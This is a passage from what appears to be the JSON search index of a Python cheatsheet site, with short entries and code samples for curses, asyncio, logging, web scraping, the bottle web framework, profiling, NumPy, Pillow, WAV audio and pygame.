Position\nD = enum.Enum('D', 'n e s w')                  # Direction\nW, H = 15, 7                                   # Width, Height\n\ndef main(screen):\n    curses.curs_set(0)                         # Makes cursor invisible.\n    screen.nodelay(True)                       # Makes getch() non-blocking.\n    asyncio.run(main_coroutine(screen))        # Starts running asyncio code.\n\nasync def main_coroutine(screen):\n    state = {'*': P(0, 0), **{id_: P(W//2, H//2) for id_ in range(10)}}\n    moves = asyncio.Queue()\n    coros = (*(random_controller(id_, moves) for id_ in range(10)),\n             human_controller(screen, moves), model(moves, state), view(state, screen))\n    await asyncio.wait(coros, return_when=asyncio.FIRST_COMPLETED)\n\nasync def random_controller(id_, moves):\n    while True:\n        d = random.choice(list(D))\n        moves.put_nowait((id_, d))\n        await asyncio.sleep(random.triangular(0.01, 0.65))\n\nasync def human_controller(screen, moves):\n    while True:\n        ch = screen.getch()\n        key_mappings = {258: D.s, 259: D.n, 260: D.w, 261: D.e}\n        if ch in key_mappings:\n            moves.put_nowait(('*', key_mappings[ch]))\n        await asyncio.sleep(0.005)\n\nasync def model(moves, state):\n    while state['*'] not in (state[id_] for id_ in range(10)):\n        id_, d = await moves.get()\n        x, y   = state[id_]\n        deltas = {D.n: P(0, -1), D.e: P(1, 0), D.s: P(0, 1), D.w: P(-1, 0)}\n        state[id_] = P((x + deltas[d].x) % W, (y + deltas[d].y) % H)\n\nasync def view(state, screen):\n    offset = P(curses.COLS//2 - W//2, curses.LINES//2 - H//2)\n    while True:\n        screen.erase()\n        curses.textpad.rectangle(screen, offset.y-1, offset.x-1, offset.y+H, offset.x+W)\n        for id_, p in state.items():\n            screen.addstr(offset.y + (p.y - state['*'].y + H//2) % H,\n                          offset.x + (p.x - state['*'].x + W//2) % W, str(id_))\n        await asyncio.sleep(0.005)\n\nif __name__ == '__main__':\n    curses.wrapper(main)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#libraries","title":"Libraries","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#progress-bar","title":"Progress Bar","text":"<pre><code># $ pip3 install tqdm\n&gt;&gt;&gt; from tqdm import tqdm\n&gt;&gt;&gt; from time import sleep\n&gt;&gt;&gt; for el in tqdm([1, 2, 3], desc='Processing'):\n...     sleep(1)\nProcessing: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 3/3 [00:03&lt;00:00,  1.00s/it]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#plot","title":"Plot","text":"<pre><code># $ pip3 install matplotlib\nimport matplotlib.pyplot as plt\nplt.plot(&lt;x_data&gt;, &lt;y_data&gt; [, label=&lt;str&gt;])   # Or: plt.plot(&lt;y_data&gt;)\nplt.legend()                                   # Adds a legend.\nplt.savefig(&lt;path&gt;)                            # Saves the figure.\nplt.show()                                     # Displays the figure.\nplt.clf()                                      # Clears the figure.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#table","title":"Table","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#prints-a-csv-file-as-an-ascii-table","title":"Prints a CSV file as an ASCII table:","text":"<pre><code># $ pip3 install tabulate\nimport csv, tabulate\nwith open('test.csv', encoding='utf-8', newline='') as file:\n    rows   = csv.reader(file)\n    header = next(rows)\n    table  = tabulate.tabulate(rows, header)\nprint(table)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#curses","title":"Curses","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#runs-a-basic-file-explorer-in-the-terminal","title":"Runs a basic file explorer in the terminal:","text":"<pre><code>from curses import wrapper, ascii, A_REVERSE, KEY_DOWN, KEY_UP, KEY_LEFT, KEY_RIGHT, KEY_ENTER\nfrom os import listdir, path, chdir\n\ndef main(screen):\n    ch, first, selected, paths = 0, 0, 0, listdir()\n    while ch != ascii.ESC:\n        height, _ = screen.getmaxyx()\n        screen.erase()\n        for y, filename in enumerate(paths[first : first+height]):\n            screen.addstr(y, 0, filename, A_REVERSE * (selected == first + y))\n        ch = screen.getch()\n        selected += (ch == KEY_DOWN) - (ch == KEY_UP)\n        selected = max(0, min(len(paths)-1, selected))\n        first += (first &lt;= selected - height) - (first &gt; selected)\n        if ch in [KEY_LEFT, KEY_RIGHT, KEY_ENTER, 10, 13]:\n            new_dir = '..' if ch == KEY_LEFT else paths[selected]\n            if path.isdir(new_dir):\n                chdir(new_dir)\n                first, selected, paths = 0, 0, listdir()\n\nif __name__ == '__main__':\n    wrapper(main)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#logging","title":"Logging","text":"<pre><code># $ pip3 install loguru\nfrom loguru import logger\n</code></pre> <pre><code>logger.add('debug_{time}.log', colorize=True)  # Connects a log file.\nlogger.add('error_{time}.log', level='ERROR')  # Another file for errors or higher.\nlogger.&lt;level&gt;('A logging message.')\n</code></pre> <ul> <li>Levels: <code>'debug'</code>, <code>'info'</code>, <code>'success'</code>, <code>'warning'</code>, <code>'error'</code>, <code>'critical'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#exceptions_2","title":"Exceptions","text":"<p>Exception description, stack trace and values of variables are appended automatically.</p> <pre><code>try:\n    ...\nexcept &lt;exception&gt;:\n    logger.exception('An error happened.')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#rotation","title":"Rotation","text":"<p>Argument that sets a condition when a new log file is created.</p> <pre><code>rotation=&lt;int&gt;|&lt;datetime.timedelta&gt;|&lt;datetime.time&gt;|&lt;str&gt;\n</code></pre> <ul> <li><code>'&lt;int&gt;'</code> - Max file size in bytes.</li> <li><code>'&lt;timedelta&gt;'</code> - Max age of a file.</li> <li><code>'&lt;time&gt;'</code> - Time of day.</li> <li><code>'&lt;str&gt;'</code> - Any of above as a string: <code>'100 MB'</code>, <code>'1 month'</code>, <code>'monday at 12:00'</code>, ...</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#retention","title":"Retention","text":"<p>Sets a condition which old log files get deleted.</p> <pre><code>retention=&lt;int&gt;|&lt;datetime.timedelta&gt;|&lt;str&gt;\n</code></pre> <ul> <li><code>'&lt;int&gt;'</code> - Max number of files.</li> <li><code>'&lt;timedelta&gt;'</code> - Max age of a file.</li> <li><code>'&lt;str&gt;'</code> - Max age as a string: <code>'1 week, 3 days'</code>, <code>'2 months'</code>, ...</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#scraping","title":"Scraping","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#scrapes-pythons-url-version-number-and-logo-from-its-wikipedia-page","title":"Scrapes Python's URL, version number and logo from its Wikipedia page:","text":"<pre><code># $ pip3 install requests beautifulsoup4\nimport requests, bs4, os, sys\n\nWIKI_URL = 'https://en.wikipedia.org/wiki/Python_(programming_language)'\ntry:\n    html       = requests.get(WIKI_URL).text\n    document   = bs4.BeautifulSoup(html, 'html.parser')\n    table      = document.find('table', class_='infobox vevent')\n    python_url = table.find('th', text='Website').next_sibling.a['href']\n    version    = table.find('th', text='Stable release').next_sibling.strings.__next__()\n    logo_url   = table.find('img')['src']\n    logo       = requests.get(f'https:{logo_url}').content\n    filename   = os.path.basename(logo_url)\n    with open(filename, 'wb') as file:\n        file.write(logo)\n    print(f'{python_url}, {version}, file://{os.path.abspath(filename)}')\nexcept requests.exceptions.ConnectionError:\n    print(\"You've got problems with connection.\", file=sys.stderr)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#web","title":"Web","text":"<pre><code># $ pip3 install bottle\nfrom bottle import run, route, static_file, template, post, request, response\nimport json\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#run","title":"Run","text":"<pre><code>run(host='localhost', port=8080)        # Runs locally.\nrun(host='0.0.0.0', port=80)            # Runs globally.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#static-request","title":"Static Request","text":"<pre><code>@route('/img/&lt;filename&gt;')\ndef send_file(filename):\n    return static_file(filename, root='img_dir/')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dynamic-request","title":"Dynamic Request","text":"<pre><code>@route('/&lt;sport&gt;')\ndef send_html(sport):\n    return template('&lt;h1&gt;{{title}}&lt;/h1&gt;', title=sport)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#rest-request","title":"REST Request","text":"<pre><code>@post('/&lt;sport&gt;/odds')\ndef send_json(sport):\n    team = request.forms.get('team')\n    response.headers['Content-Type'] = 'application/json'\n    response.headers['Cache-Control'] = 'no-cache'\n    return json.dumps({'team': team, 'odds': [2.09, 3.74, 3.68]})\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#test","title":"Test:","text":"<pre><code># $ pip3 install requests\n&gt;&gt;&gt; import threading, requests\n&gt;&gt;&gt; threading.Thread(target=run, daemon=True).start()\n&gt;&gt;&gt; url = 'http://localhost:8080/football/odds'\n&gt;&gt;&gt; request_data = {'team': 'arsenal f.c.'}\n&gt;&gt;&gt; response = requests.post(url, data=request_data)\n&gt;&gt;&gt; response.json()\n{'team': 'arsenal f.c.', 'odds': [2.09, 3.74, 3.68]}\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#profiling","title":"Profiling","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#stopwatch","title":"Stopwatch","text":"<pre><code>from time import time\nstart_time = time()                     # Seconds since the Epoch.\n...\nduration = time() - start_time\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#high-performance","title":"High performance:","text":"<pre><code>from time import perf_counter\nstart_time = perf_counter()             # Seconds since the restart.\n...\nduration = perf_counter() - start_time\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#timing-a-snippet","title":"Timing a Snippet","text":"<pre><code>&gt;&gt;&gt; from timeit import timeit\n&gt;&gt;&gt; timeit(\"''.join(str(i) for i in range(100))\",\n...        number=10000, globals=globals(), setup='pass')\n0.34986\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#profiling-by-line","title":"Profiling by Line","text":"<pre><code># $ pip3 install line_profiler memory_profiler\n@profile\ndef main():\n    a = [*range(10000)]\n    b = {*range(10000)}\nmain()\n</code></pre> <pre><code>$ kernprof -lv test.py\nLine #   Hits     Time  Per Hit   % Time  Line Contents\n=======================================================\n     1                                    @profile\n     2                                    def main():\n     3      1    955.0    955.0     43.7      a = [*range(10000)]\n     4      1   1231.0   1231.0     56.3      b = {*range(10000)}\n</code></pre> <pre><code>$ python3 -m memory_profiler test.py\nLine #         Mem usage      Increment   Line Contents\n=======================================================\n     1        37.668 MiB     37.668 MiB   @profile\n     2                                    def main():\n     3        38.012 MiB      0.344 MiB       a = [*range(10000)]\n     4        38.477 MiB      0.465 MiB       b = {*range(10000)}\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#call-graph","title":"Call Graph","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#generates-a-png-image-of-the-call-graph-with-highlighted-bottlenecks","title":"Generates a PNG image of the call graph with highlighted bottlenecks:","text":"<pre><code># $ pip3 install pycallgraph2; brew/apt install graphviz\nimport pycallgraph2 as cg, datetime\nfilename = f'profile-{datetime.datetime.now():%Y%m%d%H%M%S}.png'\ndrawer = cg.output.GraphvizOutput(output_file=filename)\nwith cg.PyCallGraph(drawer):\n    &lt;code_to_be_profiled&gt;\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#numpy","title":"NumPy","text":"<p>Array manipulation mini-language. It can run up to one hundred times faster than the equivalent Python code. An even faster alternative that runs on a GPU is called CuPy.</p> <pre><code># $ pip3 install numpy\nimport numpy as np\n</code></pre> <pre><code>&lt;array&gt; = np.array(&lt;list/list_of_lists&gt;)\n&lt;array&gt; = np.arange(from_inclusive, to_exclusive, \u00b1step_size)\n&lt;array&gt; = np.ones(&lt;shape&gt;)\n&lt;array&gt; = np.random.randint(from_inclusive, to_exclusive, &lt;shape&gt;)\n</code></pre> <pre><code>&lt;array&gt;.shape = &lt;shape&gt;\n&lt;view&gt;  = &lt;array&gt;.reshape(&lt;shape&gt;)\n&lt;view&gt;  = np.broadcast_to(&lt;array&gt;, &lt;shape&gt;)\n</code></pre> <pre><code>&lt;array&gt; = &lt;array&gt;.sum(axis)\nindexes = &lt;array&gt;.argmin(axis)\n</code></pre> <ul> <li>Shape is a tuple of dimension sizes.</li> <li>Axis is an index of the dimension that gets aggregated. Leftmost dimension has index 0.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#indexing","title":"Indexing","text":"<pre><code>&lt;el&gt;       = &lt;2d_array&gt;[row_index, column_index]\n&lt;1d_view&gt;  = &lt;2d_array&gt;[row_index]\n&lt;1d_view&gt;  = &lt;2d_array&gt;[:, column_index]\n</code></pre> <pre><code>&lt;1d_array&gt; = &lt;2d_array&gt;[row_indexes, column_indexes]\n&lt;2d_array&gt; = &lt;2d_array&gt;[row_indexes]\n&lt;2d_array&gt; = &lt;2d_array&gt;[:, column_indexes]\n</code></pre> <pre><code>&lt;2d_bools&gt; = &lt;2d_array&gt; &gt;&lt;== &lt;el&gt;\n&lt;1d_array&gt; = &lt;2d_array&gt;[&lt;2d_bools&gt;]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#broadcasting","title":"Broadcasting","text":"<p>Broadcasting is a set of rules by which NumPy functions operate on arrays of different sizes and/or dimensions.</p> <pre><code>left  = [[0.1], [0.6], [0.8]]        # Shape: (3, 1)\nright = [ 0.1 ,  0.6 ,  0.8 ]        # Shape: (3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#1-if-array-shapes-differ-in-length-left-pad-the-shorter-shape-with-ones","title":"1. If array shapes differ in length, left-pad the shorter shape with ones:","text":"<pre><code>left  = [[0.1], [0.6], [0.8]]        # Shape: (3, 1)\nright = [[0.1 ,  0.6 ,  0.8]]        # Shape: (1, 3) &lt;- !\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#2-if-any-dimensions-differ-in-size-expand-the-ones-that-have-size-1-by-duplicating-their-elements","title":"2. If any dimensions differ in size, expand the ones that have size 1 by duplicating their elements:","text":"<pre><code>left  = [[0.1, 0.1, 0.1], [0.6, 0.6, 0.6], [0.8, 0.8, 0.8]]  # Shape: (3, 3) &lt;- !\nright = [[0.1, 0.6, 0.8], [0.1, 0.6, 0.8], [0.1, 0.6, 0.8]]  # Shape: (3, 3) &lt;- !\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#3-if-neither-non-matching-dimension-has-size-1-raise-an-error","title":"3. If neither non-matching dimension has size 1, raise an error.","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#example_1","title":"Example","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#for-each-point-returns-index-of-its-nearest-point-01-06-08-1-2-1","title":"For each point returns index of its nearest point (<code>[0.1, 0.6, 0.8] =&gt; [1, 2, 1]</code>):","text":"<pre><code>&gt;&gt;&gt; points = np.array([0.1, 0.6, 0.8])\n [ 0.1,  0.6,  0.8]\n&gt;&gt;&gt; wrapped_points = points.reshape(3, 1)\n[[ 0.1],\n [ 0.6],\n [ 0.8]]\n&gt;&gt;&gt; distances = wrapped_points - points\n[[ 0. , -0.5, -0.7],\n [ 0.5,  0. , -0.2],\n [ 0.7,  0.2,  0. ]]\n&gt;&gt;&gt; distances = np.abs(distances)\n[[ 0. ,  0.5,  0.7],\n [ 0.5,  0. ,  0.2],\n [ 0.7,  0.2,  0. ]]\n&gt;&gt;&gt; i = np.arange(3)\n[0, 1, 2]\n&gt;&gt;&gt; distances[i, i] = np.inf\n[[ inf,  0.5,  0.7],\n [ 0.5,  inf,  0.2],\n [ 0.7,  0.2,  inf]]\n&gt;&gt;&gt; distances.argmin(1)\n[1, 2, 1]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#image","title":"Image","text":"<pre><code># $ pip3 install pillow\nfrom PIL import Image\n</code></pre> <pre><code>&lt;Image&gt; = Image.new('&lt;mode&gt;', (width, height))  # Also: `color=&lt;int/tuple/str&gt;`.\n&lt;Image&gt; = Image.open(&lt;path&gt;)                    # Identifies format based on file contents.\n&lt;Image&gt; = &lt;Image&gt;.convert('&lt;mode&gt;')             # Converts image to the new mode.\n&lt;Image&gt;.save(&lt;path&gt;)                            # Selects format based on the path extension.\n&lt;Image&gt;.show()                                  # Opens image in default preview app.\n</code></pre> <pre><code>&lt;int/tuple&gt; = &lt;Image&gt;.getpixel((x, y))          # Returns a pixel.\n&lt;Image&gt;.putpixel((x, y), &lt;int/tuple&gt;)           # Writes a pixel to the image.\n&lt;ImagingCore&gt; = &lt;Image&gt;.getdata()               # Returns a flattened sequence of pixels.\n&lt;Image&gt;.putdata(&lt;list/ImagingCore&gt;)             # Writes a flattened sequence of pixels.\n&lt;Image&gt;.paste(&lt;Image&gt;, (x, y))                  # Writes an image to the image.\n</code></pre> <pre><code>&lt;2d_array&gt; = np.array(&lt;Image_L&gt;)                # Creates NumPy array from greyscale image.\n&lt;3d_array&gt; = np.array(&lt;Image_RGB&gt;)              # Creates NumPy array from color image.\n&lt;Image&gt;    = Image.fromarray(&lt;array&gt;)           # Creates image from NumPy array of floats.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#modes_1","title":"Modes","text":"<ul> <li><code>'1'</code> - 1-bit pixels, black and white, stored with one pixel per byte.</li> <li><code>'L'</code> - 8-bit pixels, greyscale.</li> <li><code>'RGB'</code> - 3x8-bit pixels, true color.</li> <li><code>'RGBA'</code> - 4x8-bit pixels, true color with transparency mask.</li> <li><code>'HSV'</code> - 3x8-bit pixels, Hue, Saturation, Value color space.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#examples","title":"Examples","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#creates-a-png-image-of-a-rainbow-gradient","title":"Creates a PNG image of a rainbow gradient:","text":"<pre><code>WIDTH, HEIGHT = 100, 100\nn_pixels = WIDTH * HEIGHT\nhues = (255 * i/n_pixels for i in range(n_pixels))\nimg = Image.new('HSV', (WIDTH, HEIGHT))\nimg.putdata([(int(h), 255, 255) for h in hues])\nimg.convert('RGB').save('test.png')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#adds-noise-to-a-png-image","title":"Adds noise to a PNG image:","text":"<pre><code>from random import randint\nadd_noise = lambda value: max(0, min(255, value + randint(-20, 20)))\nimg = Image.open('test.png').convert('HSV')\nimg.putdata([(add_noise(h), s, v) for h, s, v in img.getdata()])\nimg.convert('RGB').save('test.png')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#image-draw","title":"Image Draw","text":"<pre><code>from PIL import ImageDraw\n&lt;ImageDraw&gt; = ImageDraw.Draw(&lt;Image&gt;)\n</code></pre> <pre><code>&lt;ImageDraw&gt;.point((x, y))\n&lt;ImageDraw&gt;.line((x1, y1, x2, y2 [, ...]))\n&lt;ImageDraw&gt;.arc((x1, y1, x2, y2), from_deg, to_deg)\n&lt;ImageDraw&gt;.rectangle((x1, y1, x2, y2))\n&lt;ImageDraw&gt;.polygon((x1, y1, x2, y2 [, ...]))\n&lt;ImageDraw&gt;.ellipse((x1, y1, x2, y2))\n</code></pre> <ul> <li>Use <code>'fill=&lt;color&gt;'</code> to set the primary color.</li> <li>Use <code>'width=&lt;int&gt;'</code> to set the width of lines or contours.</li> <li>Use <code>'outline=&lt;color&gt;'</code> to set the color of the contours.</li> <li>Colors can be specified as an int, tuple, <code>'#rrggbb[aa]'</code> string or a color name.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#animation","title":"Animation","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#creates-a-gif-of-a-bouncing-ball","title":"Creates a GIF of a bouncing ball:","text":"<pre><code># $ pip3 install imageio\nfrom PIL import Image, ImageDraw\nimport imageio\nWIDTH, HEIGHT, R = 126, 126, 10\nframes = []\nfor velocity in range(1, 16):\n    y = sum(range(velocity))\n    frame = Image.new('L', (WIDTH, HEIGHT))\n    draw  = ImageDraw.Draw(frame)\n    draw.ellipse((WIDTH/2-R, y, WIDTH/2+R, y+R*2), fill='white')\n    frames.append(frame)\nframes += reversed(frames[1:-1])\nimageio.mimsave('test.gif', frames, duration=0.03)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#audio","title":"Audio","text":"<pre><code>import wave\n</code></pre> <pre><code>&lt;Wave_read&gt;  = wave.open('&lt;path&gt;', 'rb')        # Opens the WAV file.\nframerate    = &lt;Wave_read&gt;.getframerate()       # Number of frames per second.\nnchannels    = &lt;Wave_read&gt;.getnchannels()       # Number of samples per frame.\nsampwidth    = &lt;Wave_read&gt;.getsampwidth()       # Sample size in bytes.\nnframes      = &lt;Wave_read&gt;.getnframes()         # Number of frames.\n&lt;params&gt;     = &lt;Wave_read&gt;.getparams()          # Immutable collection of above.\n&lt;bytes&gt;      = &lt;Wave_read&gt;.readframes(nframes)  # Returns next 'nframes' frames.\n</code></pre> <pre><code>&lt;Wave_write&gt; = wave.open('&lt;path&gt;', 'wb')        # Truncates existing file.\n&lt;Wave_write&gt;.setframerate(&lt;int&gt;)                # 44100 for CD, 48000 for video.\n&lt;Wave_write&gt;.setnchannels(&lt;int&gt;)                # 1 for mono, 2 for stereo.\n&lt;Wave_write&gt;.setsampwidth(&lt;int&gt;)                # 2 for CD quality sound.\n&lt;Wave_write&gt;.setparams(&lt;params&gt;)                # Sets all parameters.\n&lt;Wave_write&gt;.writeframes(&lt;bytes&gt;)               # Appends frames to the file.\n</code></pre> <ul> <li>Bytes object contains a sequence of frames, each consisting of one or more samples.</li> <li>In a stereo signal, the first sample of a frame belongs to the left channel.</li> <li>Each sample consists of one or more bytes that, when converted to an integer, indicate the displacement of a speaker membrane at a given moment.</li> <li>If sample width is one byte, then the integer should be encoded unsigned.</li> <li>For all other sizes, the integer should be encoded signed with little-endian byte order.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sample-values","title":"Sample Values","text":"<pre><code>+-----------+-------------+------+-------------+\n| sampwidth |     min     | zero |     max     |\n+-----------+-------------+------+-------------+\n|     1     |           0 |  128 |         255 |\n|     2     |      -32768 |    0 |       32767 |\n|     3     |    -8388608 |    0 |     8388607 |\n|     4     | -2147483648 |    0 |  2147483647 |\n+-----------+-------------+------+-------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-float-samples-from-wav-file","title":"Read Float Samples from WAV File","text":"<pre><code>def read_wav_file(filename):\n    def get_int(bytes_obj):\n        an_int = int.from_bytes(bytes_obj, 'little', signed=(sampwidth != 1))\n        return an_int - 128 * (sampwidth == 1)\n    with wave.open(filename, 'rb') as file:\n        sampwidth = file.getsampwidth()\n        frames = file.readframes(-1)\n    bytes_samples = (frames[i : i+sampwidth] for i in range(0, len(frames), sampwidth))\n    return [get_int(b) / pow(2, sampwidth * 8 - 1) for b in bytes_samples]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-float-samples-to-wav-file","title":"Write Float Samples to WAV File","text":"<pre><code>def write_to_wav_file(filename, float_samples, nchannels=1, sampwidth=2, framerate=44100):\n    def get_bytes(a_float):\n        a_float = max(-1, min(1 - 2e-16, a_float))\n        a_float += sampwidth == 1\n        a_float *= pow(2, sampwidth * 8 - 1)\n        return int(a_float).to_bytes(sampwidth, 'little', signed=(sampwidth != 1))\n    with wave.open(filename, 'wb') as file:\n        file.setnchannels(nchannels)\n        file.setsampwidth(sampwidth)\n        file.setframerate(framerate)\n        file.writeframes(b''.join(get_bytes(f) for f in float_samples))\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#examples_1","title":"Examples","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#saves-a-440-hz-sine-wave-to-a-mono-wav-file","title":"Saves a 440 Hz sine wave to a mono WAV file:","text":"<pre><code>from math import pi, sin\nsamples_f = (sin(i * 2 * pi * 440 / 44100) for i in range(100000))\nwrite_to_wav_file('test.wav', samples_f)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#adds-noise-to-a-mono-wav-file","title":"Adds noise to a mono WAV file:","text":"<pre><code>from random import random\nadd_noise = lambda value: value + (random() - 0.5) * 0.03\nsamples_f = (add_noise(f) for f in read_wav_file('test.wav'))\nwrite_to_wav_file('test.wav', samples_f)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#plays-a-wav-file","title":"Plays a WAV file:","text":"<pre><code># $ pip3 install simpleaudio\nfrom simpleaudio import play_buffer\nwith wave.open('test.wav', 'rb') as file:\n    p = file.getparams()\n    frames = file.readframes(-1)\n    play_buffer(frames, p.nchannels, p.sampwidth, p.framerate)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#text-to-speech","title":"Text to Speech","text":"<pre><code># $ pip3 install pyttsx3\nimport pyttsx3\nengine = pyttsx3.init()\nengine.say('Sally sells seashells by the seashore.')\nengine.runAndWait()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#synthesizer","title":"Synthesizer","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#plays-popcorn-by-gershon-kingsley","title":"Plays Popcorn by Gershon Kingsley:","text":"<pre><code># $ pip3 install simpleaudio\nimport math, struct, simpleaudio\nfrom itertools import repeat, chain\nF  = 44100\nP1 = '71\u2669,69\u266a,,71\u2669,66\u266a,,62\u2669,66\u266a,,59\u2669,,'\nP2 = '71\u2669,73\u266a,,74\u2669,73\u266a,,74\u266a,,71\u266a,,73\u2669,71\u266a,,73\u266a,,69\u266a,,71\u2669,69\u266a,,71\u266a,,67\u266a,,71\u2669,,'\nget_pause   = lambda seconds: repeat(0, int(seconds * F))\nsin_f       = lambda i, hz: math.sin(i * 2 * math.pi * hz / F)\nget_wave    = lambda hz, seconds: (sin_f(i, hz) for i in range(int(seconds * F)))\nget_hz      = lambda key: 8.176 * 2 ** (int(key) / 12)\nparse_note  = lambda note: (get_hz(note[:2]), 1/4 if '\u2669' in note else 1/8)\nget_samples = lambda note: get_wave(*parse_note(note)) if note else get_pause(1/8)\nsamples_f   = chain.from_iterable(get_samples(n) for n in f'{P1},{P1},{P2}'.split(','))\nsamples_b   = b''.join(struct.pack('&lt;h', int(f * 30000)) for f in samples_f)\nsimpleaudio.play_buffer(samples_b, 1, 2, F)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pygame","title":"Pygame","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#basic-example_1","title":"Basic Example","text":"<pre><code># $ pip3 install pygame\nimport pygame as pg\npg.init()\nscreen = pg.display.set_mode((500, 500))\nrect = pg.Rect(240, 240, 20, 20)\nwhile all(event.type != pg.QUIT for event in pg.event.get()):\n    deltas = {pg.K_UP: (0, -1), pg.K_RIGHT: (1, 0), pg.K_DOWN: (0, 1), pg.K_LEFT: (-1, 0)}\n    for ch, is_pressed in enumerate(pg.key.get_pressed()):\n        rect = rect.move(deltas[ch]) if ch in deltas and is_pressed else rect\n    screen.fill((0, 0, 0))\n    pg.draw.rect(screen, (255, 255, 255), rect)\n    pg.display.flip()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#rectangle","title":"Rectangle","text":"<p>Object for storing rectangular coordinates.</p> <pre><code>&lt;Rect&gt; = pg.Rect(x, y, width, height)           # Floats get truncated into ints.\n&lt;int&gt;  = &lt;Rect&gt;.x/y/centerx/centery/\u2026           # Top, right, bottom, left. Allows assignments.\n&lt;tup.&gt; = &lt;Rect&gt;.topleft/center/\u2026                # Topright, bottomright, bottomleft. Same.\n&lt;Rect&gt; = &lt;Rect&gt;.move((x, y))                    # Use move_ip() to move in-place.\n</code></pre> <pre><code>&lt;bool&gt; = &lt;Rect&gt;.collidepoint((x, y))            # Checks if rectangle contains a point.\n&lt;bool&gt; = &lt;Rect&gt;.colliderect(&lt;Rect&gt;)             # Checks if two rectangles overlap.\n&lt;int&gt;  = &lt;Rect&gt;.collidelist(&lt;list_of_Rect&gt;)     # Returns index of first colliding Rect or -1.\n&lt;list&gt; = &lt;Rect&gt;.collidelistall(&lt;list_of_Rect&gt;)  # Returns indexes of all colliding rectangles.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#surface","title":"Surface","text":"<p>Object for representing images.</p> <pre><code>&lt;Surf&gt; = pg.display.set_mode((width, height))   # Returns a display surface.\n&lt;Surf&gt; = pg.Surface((width, height))            # New RGB surface. RGBA if `flags=pg.SRCALPHA`.\n&lt;Surf&gt; = pg.image.load('&lt;path&gt;')                # Loads the image. Format depends on source.\n&lt;Surf&gt; = &lt;Surf&gt;.subsurface(&lt;Rect&gt;)              # Returns a subsurface.\n</code></pre> <pre><code>&lt;Surf&gt;.fill(color)                              # Tuple, Color('#rrggbb[aa]') or Color(&lt;name&gt;).\n&lt;Surf&gt;.set_at((x, y), color)                    # Updates 